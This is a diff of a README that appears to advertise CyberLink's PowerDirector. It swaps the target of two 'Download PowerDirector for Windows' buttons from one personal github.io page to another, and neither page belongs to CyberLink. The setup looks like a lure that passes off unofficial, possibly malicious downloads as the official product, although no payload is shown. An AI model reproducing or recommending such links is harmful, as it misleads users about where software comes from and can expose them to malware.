@@ -16,7 +16,7 @@ PowerDirector is CyberLink's advanced video editor for Windows, offered in Ultra
 <div align="center">
   <h3>Pro-grade video editing with the power to match your ambition</h3>
 
-  [![Download PowerDirector](https://img.shields.io/badge/⬇_Download_PowerDirector_for_Windows-2962FF?style=for-the-badge)](https://zanssceo.github.io/.github/PowerDirector-Ultimate-Editor-App)
+  [![Download PowerDirector](https://img.shields.io/badge/⬇_Download_PowerDirector_for_Windows-2962FF?style=for-the-badge)](https://joshuawright68.github.io/.github/PowerDirector-Ultimate-Editor-App)
 
 </div>
 
@@ -90,7 +90,7 @@ For help with PowerDirector, open the built-in Help or Support section inside th
 <div align="center">
   <h3>Ready to get started with PowerDirector?</h3>
 
-  [![Download PowerDirector](https://img.shields.io/badge/⬇_Download_PowerDirector_for_Windows-2962FF?style=for-the-badge)](https://zanssceo.github.io/.github/PowerDirector-Ultimate-Editor-App)
+  [![Download PowerDirector](https://img.shields.io/badge/⬇_Download_PowerDirector_for_Windows-2962FF?style=for-the-badge)](https://joshuawright68.github.io/.github/PowerDirector-Ultimate-Editor-App)
 
 </div>
 
